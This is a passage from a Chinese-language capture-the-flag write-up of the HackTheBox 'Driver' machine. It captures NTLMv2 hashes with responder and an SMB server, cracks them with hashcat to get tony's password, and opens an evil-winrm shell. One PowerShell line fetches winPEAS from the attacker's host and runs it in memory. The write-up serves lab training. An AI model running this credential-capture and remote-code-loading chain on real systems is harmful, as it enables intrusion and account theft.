class="line">[+] Exiting...</span><br></pre></td></tr></table></figure>

<h5 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h5><p>其实responder这⾥也可以⽤<strong>smbserver服务器替代</strong>，⽐如先建⽴⼀个当前⽬录的共享，共享名为test：</p>
<p>然后将之前的scf⽂件重新上传，同样也能看到smbserver的⽇志已经捕捉到了ntlmv2哈希。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> impacket-smbserver <span class="built_in">test</span> . -smb2support </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.129.40.36,49594)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)</span><br><span class="line">[*] User DRIVER\tony authenticated successfully</span><br><span class="line">[*]</span><br><span class="line">tony::DRIVER:aaaaaaaaaaaaaaaa:afda2e9608d11e16b53f1f35e75171a3:0101000000000000808bdae16fa5da01d201fa7c9015661300000000010010004a006900790078007600770056005600030010004a0069007900780076007700560056000200100050005900500067005900610056005400040010005000590050006700590061005600540007000800808bdae16fa5da01060004000200000008003000300000000000000000000000002000003754e27c9803f40a182b2657eb8193aa5eb370597b636d83ae5ab2ce59e879ca0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000</span><br><span class="line">[*] Connecting Share(1:IPC$)</span><br><span class="line">[*] Connecting Share(2:redteamnotes)</span><br><span class="line">[*] Disconnecting Share(1:IPC$)</span><br><span class="line">[*] Disconnecting Share(2:redteamnotes)</span><br><span class="line">[*] Closing down connection (10.129.40.36,49594)</span><br></pre></td></tr></table></figure>



<p>ctrl+c结束掉responder命令，然后提取出其中的hash，存⼊digest⽂件中。</p>
<p>这⾥启动responder的时候，我⽤了-v参数，否则可能会出现如下捕捉后划过捕捉的状态：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> responder -I tun0 </span><br><span class="line">......</span><br><span class="line">[*] Skipping previously captured <span class="built_in">hash</span> <span class="keyword">for</span> DRIVER\tony</span><br><span class="line">[*] Skipping previously captured <span class="built_in">hash</span> <span class="keyword">for</span> DRIVER\tony</span><br><span class="line">[*] Skipping previously captured <span class="built_in">hash</span> <span class="keyword">for</span> DRIVER\tony</span><br><span class="line">[+] Exiting...</span><br></pre></td></tr></table></figure>

<p>其实无伤大雅，也就是不重复捕捉⽽已，也可以在kali的 <code>/usr/share/responder/logs/ </code>看到历史记录。</p>
<h4 id="破解NTLMv2哈希"><a href="#破解NTLMv2哈希" class="headerlink" title="破解NTLMv2哈希"></a>破解<strong>NTLMv2</strong>哈希</h4><p>认识一手这哥们：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client : 10.129.40.36</span><br><span class="line">[SMB] NTLMv2-SSP Username : DRIVER\tony</span><br><span class="line">[SMB] NTLMv2-SSP Hash :</span><br><span class="line">tony::DRIVER:b558c4920db32a40:EDEFDDF5010502EB0BE3049977FD6CE0:010100000000000000B9E32944A5DA019005C2FBCD3E5D1A0000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br></pre></td></tr></table></figure>

<p><code>tony::DRIVER</code>是<code>⽤户和域名</code>，<code>49bd74badf6a3323</code>是<code>⽤户哈希</code>（NTLM哈希），<code>C89102A376780EC97035160055778802</code>是<code>服务器挑战</code>（Challenge），最后⼀⻓串是<code>⽤户响应</code>（Response）。</p>
<p>提取一下其中hash部分：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ grep -o <span class="string">&#x27;tony::.*&#x27;</span> digest | <span class="built_in">tee</span> digest-only </span><br><span class="line">tony::DRIVER:b558c4920db32a40:EDEFDDF5010502EB0BE3049977FD6CE0:010100000000000000B9E32944A5DA019005C2FBCD3E5D1A0000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br><span class="line">tony::DRIVER:b4e90390151fb9cf:9C5536B86BE2CC1E4450B33AE0652DA3:010100000000000000B9E32944A5DA01835CA668D7A488860000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br><span class="line">tony::DRIVER:d1ef10087e82a7bb:4F1C96A969B8A4E19054D8E80160E028:010100000000000000B9E32944A5DA01521BA2EBA144813F0000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br></pre></td></tr></table></figure>

<p>注意观察每次的hash都不同：</p>
<p>这是<code>ntlmv2</code>的hash，机制决定了即使同⼀个⽤户，密码⼀直没变，ntlmv2的值也会不同。因为在NTLMv2的认证过程中，<strong>服务器会⽣成⼀个随机数作为挑战给客户端</strong>。这个<strong>挑战是随机的</strong>，每次认证请求都会不同，因此即使是相同的⽤户和密码，响应也会因为服务器挑战的不同⽽不同。除了服务器挑战之外，<strong>NTLMv2协议还允许客户端⽣成⾃⼰的挑战</strong>，这同样是⼀个随机数。客户端挑战也会被包含在最终的响应中。<strong>NTLMv2 的响应中通常还会包含⼀个时间戳，这个时间戳是认证发⽣时的具体时间点</strong>。时间戳的加⼊进⼀步增加了每次响应的唯⼀性。所以如上应该是⼀个⽤户的认证。</p>
<p><strong>这个hash怎么⽤，能hash传递吗？</strong></p>
<ul>
<li>答案是不能的，因为这个hash的⽣成值⾥⾯有<strong>随机值</strong>，还有时间戳，不能做hash重⽤，所以要⽤也<strong>只能破解</strong>。</li>
</ul>
<hr>

<p>先识别⼀下ntlmv2的模式类型</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ hashcat --<span class="built_in">help</span> | grep -i ntlm</span><br><span class="line"> 5500 | NetNTLMv1 / NetNTLMv1+ESS | Network</span><br><span class="line">Protocol</span><br><span class="line"> 27000 | NetNTLMv1 / NetNTLMv1+ESS (NT) | Network</span><br><span class="line">Protocol</span><br><span class="line"> 5600 | NetNTLMv2 | Network</span><br><span class="line">Protocol</span><br><span class="line"> 27100 | NetNTLMv2 (NT) | Network</span><br><span class="line">Protocol</span><br><span class="line"> 1000 | NTLM |</span><br><span class="line">Operating System</span><br></pre></td></tr></table></figure>

<p>不难判断是5600，也可以借助⼯具识别，我们现在不是识别类型，类型我们已经知道，responder的结果就说了类型了，是想知道<code>hashcat</code>破解时的mode。所以且不说hash-identifier识别的准还是不准，功能上就不满⾜。</p>
<p>其实说起来hash-identifier的屡屡识别不准，所以有一个更好的工具推荐：<code>nth</code>:name that hash</p>
<p>github仓库：(<a target="_blank" rel="noopener" href="https://github.com/HashPals/Name-That-Hash">https://github.com/HashPals/Name-That-Hash</a>)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─<span class="variable">$nth</span> --file digest-only</span><br><span class="line">_   _                           _____ _           _          _   _           _     </span><br><span class="line"> | \ | |                         |_   _| |         | |        | | | |         | |    </span><br><span class="line"> |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  </span><br><span class="line"> | . ` |/ _` | <span class="string">&#x27;_ ` _ \ / _ \______| | | &#x27;</span>_ \ / _` | __|______|  _  |/ _` / __| <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"> | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |</span></span><br><span class="line"><span class="string"> \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://twitter.com/bee_sec_san</span></span><br><span class="line"><span class="string">https://github.com/HashPals/Name-That-Hash </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tony::DRIVER:9805a1c04bcadcbd:B23D7CAC6F424B16DA5B0B0A56608376:010100000000000000C1C8116E3CDB017864C07A9ED9F9FE0000000002000800570049003100310001001E00570049</span></span><br><span class="line"><span class="string">004E002D004D00410047004400570036004E00590058003700380004003400570049004E002D004D00410047004400570036004E0059005800370038002E0057004900310031002E004C004F00430</span></span><br><span class="line"><span class="string">041004C000300140057004900310031002E004C004F00430041004C000500140057004900310031002E004C004F00430041004C000700080000C1C8116E3CDB010600040002000000080030003000</span></span><br><span class="line"><span class="string">0000000000000000000000200000E84091EDC9060A2C78784CFED332099AC1E648A1B661A74F6722500F56FBED190A0010000000000000000000000000000000000009001E0063006900660073002</span></span><br><span class="line"><span class="string">F00310030002E00310030002E00310036002E003400000000000000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">NetNTLMv2, HC: 5600 JtR: netntlmv2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tony::DRIVER:5eee6d97b85bf7b1:D3527A19F9F7B21D0D86DCAF12F8CBDA:010100000000000000C1C8116E3CDB0187D6F7292FC2FA790000000002000800570049003100310001001E00570049</span></span><br><span class="line"><span class="string">004E002D004D00410047004400570036004E00590058003700380004003400570049004E002D004D00410047004400570036004E0059005800370038002E0057004900310031002E004C004F00430</span></span><br><span class="line"><span class="string">041004C000300140057004900310031002E004C004F00430041004C000500140057004900310031002E004C004F00430041004C000700080000C1C8116E3CDB010600040002000000080030003000</span></span><br><span class="line"><span class="string">0000000000000000000000200000E84091EDC9060A2C78784CFED332099AC1E648A1B661A74F6722500F56FBED190A0010000000000000000000000000000000000009001E0063006900660073002</span></span><br><span class="line"><span class="string">F00310030002E00310030002E00310036002E003400000000000000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">NetNTLMv2, HC: 5600 JtR: netntlmv2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tony::DRIVER:a274086f3be17782:9D5C4FED126604E4FFE741A4B60AA002:010100000000000000C1C8116E3CDB0172B29D84DB7945250000000002000800570049003100310001001E00570049</span></span><br><span class="line"><span class="string">004E002D004D00410047004400570036004E00590058003700380004003400570049004E002D004D00410047004400570036004E0059005800370038002E0057004900310031002E004C004F00430</span></span><br><span class="line"><span class="string">041004C000300140057004900310031002E004C004F00430041004C000500140057004900310031002E004C004F00430041004C000700080000C1C8116E3CDB010600040002000000080030003000</span></span><br><span class="line"><span class="string">0000000000000000000000200000E84091EDC9060A2C78784CFED332099AC1E648A1B661A74F6722500F56FBED190A0010000000000000000000000000000000000009001E0063006900660073002</span></span><br><span class="line"><span class="string">F00310030002E00310030002E00310036002E003400000000000000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">NetNTLMv2, HC: 5600 JtR: netntlmv2</span></span><br></pre></td></tr></table></figure>

<p>通过一番交叉验证没错就是5600，开始破解，期待能破解出来：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> hashcat -m 5600 digest-only /usr/share/wordlists/rockyou.txt </span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 5.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM</span><br><span class="line">16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">==============================================================================</span><br><span class="line">====================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-haswell-Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz, 2901/5866</span></span><br><span class="line">MB (1024 MB allocatable), 6MCU</span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line">Hashes: 13 digests; 13 unique digests, 13 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">TONY::DRIVER:f3b3193dcd56559c:2c56932f901f3e22b131998179c8ff0b:010100000000000000b9e32944a5da01a594e191ec8f658e0000000002000800530046004e00570001001e00570049004e002d00420038003700450052005600380047004f005500450004003400570049004e002d00420038003700450052005600380047004f00550045002e00530046004e0057002e004c004f00430041004c0003001400530046004e0057002e004c004f00430041004c0005001400530046004e0057002e004c004f00430041004c000700080000b9e32944a5da01060004000200000008003000300000000000000000000000002000003754e27c9803f40a182b2657eb8193aa5eb370597b636d83ae5ab2ce59e879ca0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000:liltony</span><br><span class="line">TONY::DRIVER:49820e408dbb146c:fbd317352b55da9cd0162104258561a6:010100000000000000b9e32944a5da01ba9bbd100e206bc50000000002000800530046004e00570001001e00570049004e002d00420038003700450052005600380047004f005500450004003400570049004e002d00420038003700450052005600380047004f00550045002e00530046004e0057002e004c004f00430041004c0003001400530046004e0057002e004c004f00430041004c0005001400530046004e0057002e004c004f00430041004c000700080000b9e32944a5da01060004000200000008003000300000000000000000000000002000003754e27c9803f40a182b2657eb8193aa5eb370597b636d83ae5ab2ce59e879ca0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000:liltony</span><br><span class="line">TONY::DRIVER:12430e8b200482bf:87e6078fdc62c2034ca53a176e141648:010100000000000000b9e32944a5da01526894628d5aa73e0000000002000800530046004e00570001001e00570049004e002d00420038003700450052005600380047004f005500450004003400570049004e002d00420038003700450052005600380047004f00550045002e00530046004e0057002e004c004f00430041004c0003001400530046004e0057002e004c004f00430041004c0005001400530046004e0057002e004c004f00430041004c000700080000b9e32944a5da01060004000200000008003000300000000000000000000000002000003754e27c9803f40a182b2657eb8193aa5eb370597b636d83ae5ab2ce59e879ca0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000:liltony</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: digest-only</span><br><span class="line">Time.Started.....: Mon May 13 15:52:45 2024 (0 secs)</span><br><span class="line">Time.Estimated...: Mon May 13 15:52:45 2024 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........: 2558.4 kH/s (0.95ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 13/13 (100.00%) Digests (total), 13/13 (100.00%) Digests</span><br><span class="line">(new), 13/13 (100.00%) Salts</span><br><span class="line">Progress.........: 439296/186477005 (0.24%)</span><br><span class="line">Rejected.........: 0/439296 (0.00%)</span><br><span class="line">Restore.Point....: 30720/14344385 (0.21%)</span><br><span class="line">Restore.Sub.#1...: Salt:12 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: !!!!!! -&gt; redlips</span><br><span class="line">Hardware.Mon.#1..: Util: 30%</span><br><span class="line">Started: Mon May 13 15:52:44 2024</span><br><span class="line">Stopped: Mon May 13 15:52:47 2024</span><br></pre></td></tr></table></figure>

<p>很快破解出来 <code>tony:liltony </code>这组凭据。其实⽤<code>john</code>也是可以的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> john digest-only --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt --pot=driver.pot</span><br></pre></td></tr></table></figure>

<p>这里后面记得加上<code>--pot=driver.pot</code>类似于生成一个日志，后续多次爆破如果爆破成功他是不显示的，但加上这个无论有无缓存后都会打印出来。</p>
<h4 id="建立系统立足点：tony的shell"><a href="#建立系统立足点：tony的shell" class="headerlink" title="建立系统立足点：tony的shell"></a>建立系统立足点：tony的shell</h4><p>先⽤netexec 测试⼀下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nxc winrm driver.htb -u tony -p liltony</span><br><span class="line">WINRM 10.129.40.36 5985 DRIVER [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)</span><br><span class="line">WINRM 10.129.40.36 5985 DRIVER [+] DRIVER\tony:liltony (Pwn3d!)</span><br></pre></td></tr></table></figure>

<img src="/posts/23837ad8/1732295872478.png" class="" width="1732295872478">

<p>wow! 直接pwned！登录上去：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> evil-winrm -i driver.htb -u tony -p liltony</span><br><span class="line">Evil-WinRM shell v3.5 </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation:</span><br><span class="line">quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">Data: For more information, check Evil-WinRM GitHub:</span><br><span class="line">https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">driver\tony</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Documents&gt; hostname</span><br><span class="line">DRIVER</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Documents&gt; ipconfig</span><br><span class="line">Windows IP Configuration</span><br><span class="line">Ethernet adapter Ethernet0:</span><br><span class="line"> Connection-specific DNS Suffix . : .htb</span><br><span class="line"> IPv6 Address. . . . . . . . . . . : dead:beef::be</span><br><span class="line"> IPv6 Address. . . . . . . . . . . : dead:beef::c9c2:bfe:78b2:d9aa</span><br><span class="line"> Temporary IPv6 Address. . . . . . : dead:beef::35c0:d063:86f2:571f</span><br><span class="line"> Link-<span class="built_in">local</span> IPv6 Address . . . . . : fe80::c9c2:bfe:78b2:d9aa%5</span><br><span class="line"> IPv4 Address. . . . . . . . . . . : 10.129.40.36</span><br><span class="line"> Subnet Mask . . . . . . . . . . . : 255.255.0.0</span><br><span class="line"> Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:acf1%5</span><br><span class="line"> 10.129.0.1</span><br><span class="line">Tunnel adapter isatap..htb:</span><br><span class="line"> Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line"> Connection-specific DNS Suffix . : .htb</span><br></pre></td></tr></table></figure>

<p>虽然是pwned，但是还不到系统管理员权限。看到有user.txt，拿下来：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\tony\Documents&gt; <span class="built_in">gc</span> C:\users\tony\Desktop\user.txt</span><br><span class="line"><span class="number">55</span>f978defaced401d0021f365553d7b7</span><br></pre></td></tr></table></figure>

<h4 id="提权枚举"><a href="#提权枚举" class="headerlink" title="提权枚举"></a>提权枚举</h4><p>提权最先要看的是web的配置⽂件，先定位web⽬录，⼀般是在c盘的inetpub下，去搜⾸⻚的图⽚，就可以定位到。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell命令：</span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\ <span class="literal">-Filter</span> ricoh.png <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"></span><br><span class="line">命令可以简写成：</span><br><span class="line"><span class="built_in">gci</span> C:\ ricoh.png <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>

<p>然后查看源码：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="built_in">gc</span> fw_up.php</span><br></pre></td></tr></table></figure>

<p>简单翻找之后，没有什么收获，决定⽤<code>winpeas</code>进⾏⾃动化枚举。在官⽅github库Release⻚下载应⽤。</p>
<p><code>https://github.com/peass-ng/PEASS-ng/releases/tag/20240512-3398870e</code></p>
<p>下载后保存在kali的⼯作路径下，并通过简易web服务提供下载⽀持。最佳实践的教程⻅这个链接，当然也是官⽅教程主⻚：</p>
<p><code>https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe</code></p>
<img src="/posts/23837ad8/1732296400008.png" class="" width="1732296400008">

<p>形成如下两条待执⾏的命令，以便以反射的⽅式在内存中执⾏⽆⽂件本地提权枚举:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"></span><br><span class="line"><span class="variable">$wp</span>=[<span class="type">System.Reflection.Assembly</span>]::Load([<span class="built_in">byte</span>[]](<span class="built_in">Invoke-WebRequest</span> <span class="string">&quot;http://10.10.16.2:8888/winPEASx64_ofs.exe&quot;</span> <span class="literal">-UseBasicParsing</span> | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> Content)); [<span class="type">winPEAS.Program</span>]::Main(<span class="string">&quot;log&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>但是没有正常执⾏：可以在本地做实验不演示。</p>
<p>这可能与当前会话的uac策略等有关，⽆论如何不能⽆⽂件执⾏，那只能冒险本地执⾏了。</p>
<p>建议在公共⽬录建⽴⼯作⽂件夹操作，我是建⽴了apps⽂件夹，以获得清晰的操作场景：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\tony\Documents&gt; <span class="built_in">cd</span> c:\programdata\;mkdir apps;<span class="built_in">cd</span> apps</span><br></pre></td></tr></table></figure>

